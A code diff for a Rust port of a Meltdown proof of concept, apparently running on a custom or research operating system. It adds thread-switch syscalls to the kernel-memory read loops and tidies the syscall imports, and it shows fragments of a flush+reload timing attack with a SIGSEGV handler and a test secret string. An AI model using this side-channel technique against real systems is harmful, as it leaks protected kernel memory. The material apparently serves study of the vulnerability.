@@ -10,8 +10,9 @@ use core::{ptr, mem};
 use alloc::alloc::{alloc, dealloc, handle_alloc_error, Layout};
 use signal::signal_vector::SignalVector;
 use signal::signal_handler::SignalHandler;
-use syscall;
+use syscall::syscall;
 use syscall::SystemCall::SignalHandlerRegister;
+use syscall::SystemCall::ThreadSwitch;
 
 use core::arch::asm;
 
@@ -126,9 +127,9 @@ pub fn libkdump_read_signal_handler(config: &Config, cache_miss_threshold: u64, 
 					return i;
 				}
 			}
-			// TODO: original has sched_yield(); here
+			syscall(ThreadSwitch, &[]); // Apparently, switching threads here is important, as otherwise always the second or third entry gets returned, TODO find out why
 		}
-		// TODO: original has sched_yield(); here
+		syscall(ThreadSwitch, &[]); // Apparently this is important, see above
 		if iteration % 10 == 9 {
 			println!("Iteration {} done!", iteration);
 		}
@@ -142,7 +143,7 @@ pub fn libkdump_read(config: &Config, cache_miss_threshold: u64, mem: &[MemoryPa
 	const ARRAY_SIZE: usize = 256;
 	let mut res_stat: [u32; ARRAY_SIZE] = [0; ARRAY_SIZE];
 	
-	// TODO: original has sched_yield(); here
+	syscall(ThreadSwitch, &[]);
 	
 	for _ in 0..config.measurements {
 		// TODO: Add implementation using TSX?
@@ -196,7 +197,7 @@ pub fn detect_flush_reload_threshold(pointer: *const MemoryPage) -> u64{
 pub fn main() {
     println!("Meltdown start\n");
     println!("Address of handle_signal is {:x}", handle_signal as u64);
-    syscall::syscall(SignalHandlerRegister, &[SignalVector::SIGSEGV as usize, handle_signal as usize]);
+    syscall(SignalHandlerRegister, &[SignalVector::SIGSEGV as usize, handle_signal as usize]);
     const ARRAY_SIZE: usize = 256; // 256 entries, each containing 256 u128's, meaning 256*4K
     const SECRET: &str = "Whoever reads this is dumb.";
     let default_config = Config {
